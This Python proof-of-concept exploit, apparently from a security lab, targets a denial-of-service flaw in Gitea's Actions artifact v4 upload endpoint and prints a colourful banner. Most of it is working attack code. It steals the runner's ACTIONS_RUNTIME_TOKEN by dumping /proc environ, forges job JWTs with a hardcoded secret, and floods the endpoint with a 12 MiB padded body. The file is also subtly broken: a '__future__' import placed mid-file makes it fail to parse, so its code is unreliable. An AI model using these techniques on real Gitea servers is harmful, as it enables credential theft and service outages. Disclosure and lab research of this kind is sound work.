#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: gitea-artifact-v4-readall (Medium: 6.5)
#  Vendor: Gitea (Gitea)
#  Versions: Gitea <= 1.27.3
#  Impact: Denial of Service (Unbounded Artifact v4 ReadAll)
#  Requires: authenticated POST /twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "gitea-artifact-v4-readall"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import base64
import hashlib
import hmac
import http.client
import json
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18135").rstrip("/")
USER = ("labadmin", "LabPass123!")
WITNESS = "GHSA-GITEA-ART-V4-READALL"
JWT_SECRET = b"gitea-art-v4-readall-lab-secret!"
V4_PATH = "/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
BODY_SIZE = 12 * 1024 * 1024  # 12 MiB, within 8–16 MiB, under the 16 MiB cap
SUMMARY_SIZE = 8 * 1024 * 1024
CTX = ssl._create_unverified_context()
COMPOSE = ["docker", "compose"]
STATUS_RUNNING = 6


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def mint_job_jwt(task_id: int, run_id: int, job_id: int) -> str:
    now = int(time.time())
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    ac = json.dumps([{"Scope": "", "Permission": 2}], separators=(",", ":"))
    claims = {
        "exp": now + 4 * 3600,
        "nbf": now - 60,
        "scp": f"Actions.Results:{run_id}:{job_id}",
        "ac": ac,
        "TaskID": task_id,
        "RunID": run_id,
        "JobID": job_id,
    }
    payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(JWT_SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"


def api(method: str, path: str, data: dict | None = None, timeout: int = 30) -> tuple[int, str]:
    tok = base64.b64encode(f"{USER[0]}:{USER[1]}".encode()).decode()
    hdrs = {
        "Content-Type": "application/json",
        "User-Agent": "gitea-artifact-v4-readall-lab",
        "Authorization": "Basic " + tok,
    }
    body = None if data is None else json.dumps(data).encode()
    r = urllib.request.Request(BASE + path, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def compose(*args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        COMPOSE + list(args),
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def steal_token_from_runner() -> str | None:
    script = r"""
for f in /proc/[0-9]*/environ; do
  tr '\0' '\n' < "$f" 2>/dev/null
done
"""
    p = compose("exec", "-T", "runner", "sh", "-c", script, timeout=20)
    if p.returncode != 0:
        print(f"IOC runner-environ rc={p.returncode} err={p.stderr[-200:]!r}")
        return None
    for line in p.stdout.splitlines():
        if line.startswith("ACTIONS_RUNTIME_TOKEN="):
            tok = line.split("=", 1)[1].strip()
            if tok:
                print("IOC token-source=runner-environ")
                return tok
        if line.startswith("ACTIONS_RUNTIME_TOKEN:"):
            tok = line.split(":", 1)[1].strip()
            if tok:
                print("IOC token-source=runner-environ")
                return tok
    return None


def sqlite_query(sql: str) -> str:
    p = compose(
        "exec",
        "-T",
        "gitea",
        "sqlite3",
        "-readonly",
        "/data/gitea/gitea.db",
        sql,
        timeout=20,
    )
    if p.returncode != 0:
        print(f"IOC sqlite rc={p.returncode} err={p.stderr[-200:]!r}")
        return ""
    return p.stdout.strip()


def running_task_from_db() -> dict | None:
    raw = sqlite_query(
        "SELECT t.id, t.job_id, j.run_id FROM action_task t "
        "JOIN action_run_job j ON j.id = t.job_id "
        f"WHERE t.status = {STATUS_RUNNING} ORDER BY t.id DESC LIMIT 1;"
    )
    if not raw or "|" not in raw:
        return None
    parts = raw.split("|")
    if len(parts) < 3:
        return None
    task_id, job_id, run_id = (int(parts[0]), int(parts[1]), int(parts[2]))
    step_raw = sqlite_query(
        f'SELECT "index" FROM action_task_step WHERE task_id = {task_id} ORDER BY "index" ASC LIMIT 1;'
    )
    step_index = int(step_raw) if step_raw.isdigit() else 0
    return {
        "task_id": task_id,
        "job_id": job_id,
        "run_id": run_id,
        "step_index": step_index,
    }


def wait_running_task(timeout_s: int = 180) -> dict | None:
    deadline = time.time() + timeout_s
    last = None
    while time.time() < deadline:
        last = running_task_from_db()
        if last:
            print(
                f"IOC running-task task_id={last['task_id']} "
                f"run_id={last['run_id']} job_id={last['job_id']} "
                f"step_index={last['step_index']}"
            )
            return last
        s, b = api("GET", "/api/v1/repos/labadmin/hold-job/actions/runs")
        print(f"IOC runs-poll status={s} snippet={b[:180]!r}")
        time.sleep(3)
    print(f"IOC no-running-task last={last}")
    return None


def http_send(
    method: str,
    path: str,
    body: bytes,
    headers: dict[str, str],
    timeout: int = 120,
) -> tuple[int, str, int]:
    parsed = urlparse(BASE)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    hdrs = dict(headers)
    hdrs["Content-Length"] = str(len(body))
    hdrs.setdefault("Host", f"{host}:{port}")
    sent = 0
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        for k, v in hdrs.items():
            conn.putheader(k, v)
        conn.endheaders()
        chunk = 64 * 1024
        view = memoryview(body)
        off = 0
        while off < len(body):
            n = min(chunk, len(body) - off)
            conn.send(view[off : off + n])
            off += n
            sent = off
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        return resp.status, data, sent
    except Exception as exc:
        return 0, f"{type(exc).__name__}: {exc}", sent
    finally:
        conn.close()


def v4_body(run_id: int, job_id: int) -> bytes:
    inner = json.dumps(
        {
            "workflow_run_backend_id": str(run_id),
            "workflow_job_run_backend_id": str(job_id),
            "name": WITNESS,
            "version": 4,
        },
        separators=(",", ":"),
    )
    pad = BODY_SIZE - len(inner)
    if pad < 1:
        raise SystemExit("FAIL body pad underflow")
    # Keys sit after the padding so a 1 MiB cap would truncate before unmarshal.
    return b"{" + (b" " * pad) + inner[1:].encode()


def main() -> None:
    print(f"IOC base={BASE} body_bytes={BODY_SIZE} summary_bytes={SUMMARY_SIZE}")
    s, b = api("GET", "/api/v1/version")
    print(f"IOC version status={s} snippet={b[:120]!r}")
    if s != 200:
        print("FAIL Gitea version endpoint")
        raise SystemExit(1)

    task = wait_running_task()
    if not task:
        print("FAIL GITEA-ARTIFACT-V4-READALL no job token without runner")
        raise SystemExit(1)

    token = steal_token_from_runner()
    if not token:
        token = mint_job_jwt(task["task_id"], task["run_id"], task["job_id"])
        print("IOC token-source=forged-jwt-from-running-task")
    print(f"IOC token-prefix={token[:24]}...")

    auth = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json",
        "User-Agent": "gitea-artifact-v4-readall-lab",
    }

    body = v4_body(task["run_id"], task["job_id"])
    print(f"IOC v4-body-len={len(body)} tail={body[-80:]!r}")
    t0 = time.time()
    st, resp, sent = http_send("POST", V4_PATH, body, auth)
    dt = time.time() - t0
    print(f"IOC v4-create status={st} sent={sent} dt={dt:.3f}s snippet={resp[:280]!r}")

    if sent < BODY_SIZE:
        print(f"FAIL v4 body not fully accepted sent={sent} want={BODY_SIZE}")
        raise SystemExit(1)

    low = resp.lower()
    accepted = False
    if st == 200 and ("signedUploadUrl" in resp or "signed_upload_url" in resp or '"ok":true' in resp.replace(" ", "")):
        accepted = True
    elif st == 400 and "run-id" in low:
        accepted = True
    elif st == 500 and "decode request body" in low:
        print("FAIL v4 decode error; body likely truncated before unmarshal")
        raise SystemExit(1)
    elif st in (413, 400) and ("too large" in low or "entity too large" in low or "payload" in low):
        print("FAIL v4 also caps the body")
        raise SystemExit(1)
    elif st == 200:
        accepted = True
    elif st in (400, 201) and WITNESS.lower() not in low:
        # Unmarshal ran; create may reject a field after ReadAll.
        accepted = True

    if not accepted:
        print("FAIL v4 create did not reach unmarshal")
        raise SystemExit(1)
    print("IOC v4-unbounded-readall=1")

    summary_path = (
        f"/api/actions_pipeline/_apis/pipelines/workflows/{task['run_id']}"
        f"/jobs/{task['job_id']}/steps/{task['step_index']}/summary"
    )
    sum_headers = dict(auth)
    sum_headers["Content-Type"] = "text/markdown"
    sum_body = b"a" * SUMMARY_SIZE
    t1 = time.time()
    sst, sresp, ssent = http_send("PUT", summary_path, sum_body, sum_headers)
    sdt = time.time() - t1
    print(
        f"IOC job-summary status={sst} sent={ssent} dt={sdt:.3f}s "
        f"snippet={sresp[:220]!r} cap=MaxJobSummarySize=1048576"
    )
    # Negative control: LimitReader(MaxJobSummarySize+1) then 400 invalid summary,
    # or a documented 1 MiB cap even if the step is missing.
    if sst == 400 and ("invalid summary" in sresp.lower() or "aggregate" in sresp.lower()):
        print("IOC job-summary-limitreader=1")
    elif sst == 400:
        print("IOC job-summary-capped-or-validated=1")
    elif sst == 0 and ssent < SUMMARY_SIZE:
        print("IOC job-summary-limitreader-early-stop=1")
    else:
        print("IOC job-summary-documented-cap=MaxJobSummarySize-1MiB")

    s2, b2 = api("GET", "/api/v1/version")
    print(f"IOC gitea-still-up status={s2} snippet={b2[:80]!r}")
    if s2 != 200:
        print("FAIL Gitea died after body send")
        raise SystemExit(1)

    print("SUCCESS GITEA-ARTIFACT-V4-READALL")


if __name__ == "__main__":
    main()

